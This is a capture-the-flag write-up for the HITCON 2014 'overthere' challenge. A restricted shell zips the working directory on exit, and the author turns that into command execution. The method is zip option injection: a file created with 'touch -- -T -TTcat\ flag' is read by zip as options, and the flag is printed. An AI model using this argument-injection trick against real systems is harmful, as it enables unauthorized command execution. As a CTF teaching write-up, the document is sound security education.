# HITCON CTF 2014: overthere

**Category:** Misc.
**Points:** 179
**Description:**

> ```bash
> nc 210.65.11.5 4994
> ```

## Write-up

```bash
root@kali:~# nc 210.65.11.5 4994

 **      ** ** **********   ******    *******   ****     **   **     **
/**     /**/**/////**///   **////**  **/////** /**/**   /**  //**   **
/**     /**/**    /**     **    //  **     //**/**//**  /**   //** **
/**********/**    /**    /**       /**      /**/** //** /**    //***
/**//////**/**    /**    /**       /**      /**/**  //**/**     **/**
/**     /**/**    /**    //**    **//**     ** /**   //****    ** //**
/**     /**/**    /**     //******  //*******  /**    //***   **   //**
//      // //     //       //////    ///////   //      ///   //     //
                                                            by oldtrick

Welcome to my shell. Just pwn to own.

$
```

Cool, a shell!

```
$ ls -lha
total 120K
drwxrwxrwx    2 2137755712 overthere 4.0K Aug 18 01:01 .
drwx-wx-wx 1270 root       root      108K Aug 18 01:01 ..
-rw-r--r--    1 2137755712 overthere    0 Aug 18 01:01 atdog_said_it's_easy
-rw-r--r--    1 2137755712 overthere   34 Aug 18 01:01 flag

$ help
Command:
	echo, exit, touch, cat, ls
id - return user identity
uname - display information about the system
echo - write arguments to the standard output
touch - change file access and modification times
ls - list directory contents
cat - concatenate and print files
exit - backup your files and exit

$ id
uid=2137755712 gid=1001(overthere)

$ uname
Linux

$ uname -a
Linux ctf 3.13.0-30-generic #54-Ubuntu SMP Mon Jun 9 22:45:01 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

Okay, so a lot of things work. However, there are some problems. For example, you can’t directly `cat` a file:

```bash
$ cat flag
Serious? Are you kidding me?!
$ touch test
$ cat test
Serious? Are you kidding me?!
```

Output redirection doesn’t work the way you’d expect it to:

```bash
$ echo test > test
Invalid character.
```

When we type exit we see the following:

```bash
$ exit

Start zipping file...
  adding: atdog_said_it's_easy (stored 0%)
Done.

Did you forget to catch the flag?

Bye!
```

We can see that at exit the current working directory is passed as arguments to the `zip` command. Using `touch` to create a new file that will be used as commandline arguments to `exit` seems like a viable option. A good thing to do is to leverage the `-T`/`--test` and `-TT` options of the `zip` command which do the following:

```
-T
--test
    Test the integrity of the new zip file. If the check fails, the old zip file is unchanged and (with the -m option) no input files are removed.

-TT cmd
--unzip-command cmd
    Use command cmd instead of 'unzip -tqq' to test an archive when the -T option is used. On Unix, to use a copy of unzip in the current directory instead of the standard system unzip, could use:
    zip archive file1 file2 -T -TT "./unzip -tqq"

    In cmd, {} is replaced by the name of the temporary archive, otherwise the name of the archive is appended to the end of the command. The return code is checked for success (0 on Unix).
```

With this we see that we can force the zip archive to be tested and even provide the command to test with. The hard part about this attack is that we need to be able to create a file with the filname of commandline arguments which would normally be processed by `touch` and cause an error as they are not legitimate arguments to the `touch` command. We can remedy this by using the `--` argument which reads in our filename from STDIN instead of literally from the commandline.

Leveraging this information we come up with the following command which allows us to bypass the restriction of running cat directly as well as all other restrictions.

```bash
touch -- -T -TTcat\ flag
```

We run that command and then run `exit` and get the following

```bash
root@kali:~# nc 210.65.11.5 4994

 **      ** ** **********   ******    *******   ****     **   **     **
/**     /**/**/////**///   **////**  **/////** /**/**   /**  //**   **
/**     /**/**    /**     **    //  **     //**/**//**  /**   //** **
/**********/**    /**    /**       /**      /**/** //** /**    //***
/**//////**/**    /**    /**       /**      /**/**  //**/**     **/**
/**     /**/**    /**    //**    **//**     ** /**   //****    ** //**
/**     /**/**    /**     //******  //*******  /**    //***   **   //**
//      // //     //       //////    ///////   //      ///   //     //
                                                            by oldtrick

Welcome to my shell. Just pwn to own.
$ touch -- -T -TTcat\ flag
$ exit

Start zipping file...
  adding: atdog_said_it's_easy (stored 0%)
HITCON{0ld_7rick5_alw4y5_workS!!}
PK
ocEatdog_said_it's_easyUT	���S���Sux
                                          �Z��PK
ocE��atdog_said_it's_easyUT���Sux
                                 �Z��PKZNtest of takeaway.zip OK
Done.

Did you forget to catch the flag?

Bye!
```

The flag is
> `HITCON{0ld\_7rick5\_alw4y5\_workS!!}`.

## Other write-ups and resources

* <http://givemesecurity.info/2014/08/18/overthere-writeup-hitcon-2014/>
* [Unix Wildcards Gone Wild](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
* <https://gist.github.com/anthraxx/fe4984780a9f284dee08>
* <https://rzhou.org/~ricky/hitcon2014/overthere/>
